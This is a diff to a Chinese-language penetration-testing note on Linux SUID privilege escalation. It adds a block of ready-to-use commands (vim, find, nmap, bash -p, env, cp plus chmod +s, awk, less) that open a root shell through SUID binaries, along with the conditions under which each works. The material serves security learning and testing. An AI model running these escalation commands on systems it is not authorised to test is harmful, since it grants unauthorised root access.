@@ -10,6 +10,8 @@ SUID 提权属于 Linux 本地提权里最常见、也最稳定的一类。核�
 - 目标存在 root 所有、且带 `s` 位的危险程序。
 - 程序本身支持执行命令、加载脚本或切换用户。
 
+> 与 [PEN-Linux-LPE.md](./PEN-Linux-LPE.md) 的分工：本文专注 SUID 的原理与专项利用命令；全量提权方向（sudo、Capability、内核漏洞等）的速查见 LPE 文。
+
 ## 0x01 基础知识
 
 ### setuid是什么？
@@ -56,6 +58,47 @@ os.system('whoami')
 
 
 [简谈setuid提权](https://www.freebuf.com/articles/web/272617.html) 其中包括一些常见的应用setuid提权方法。     
+
+### 经典 SUID 利用命令
+
+以下命令在对应程序自身带 SUID 位（以 SUID root 运行）时可直接拉起 root shell，逐条注明适用条件：
+
+```bash
+# vim：-c 在启动时执行命令（sudo 环境下同理）
+vim -c ':!sh'
+
+# find：-exec 执行命令；-p 让 shell 保留特权 euid（关键，否则特权会被丢弃）
+find . -exec /bin/sh -p \;
+
+# nmap 老版本（< 5.21）：交互模式内置 shell
+nmap --interactive
+!sh
+
+# bash：仅当 bash 自身被设置了 SUID（现代发行版默认不开启）
+bash -p
+
+# env：以特权环境执行指定程序
+env /bin/sh -p
+
+# cp：拷贝 shell 后补 SUID 位（需 cp、chmod/install 至少一个可特权执行）
+cp /bin/bash /tmp/bash
+chmod +s /tmp/bash
+/tmp/bash -p
+
+# awk：system() 直接执行
+awk 'BEGIN {system("/bin/sh")}'
+
+# less/more：查看文件时内部执行
+less /etc/passwd
+# 进入后输入 !sh 回车
+```
+
+适用条件与注意：
+
+- `bash -p`、`env /bin/sh -p`：仅当二进制自身带 SUID 位；`-p` 用于阻止 shell 启动时主动丢弃特权 euid。
+- `nmap --interactive`：仅 nmap < 5.21；新版本可尝试 `--script` 配合可写脚本目录。
+- `cp`：SUID cp 以 root 身份复制文件，通常出现在 `sudo` 允许 cp/chmod 组合、或与另一特权程序链式配合的场景。
+- 完整程序清单与逐程序用法（SUID / sudo / Capability 三栏适用标注）统一见 [GTFOBins](https://gtfobins.github.io/)。
 
 ## 0x03 排查重点
 
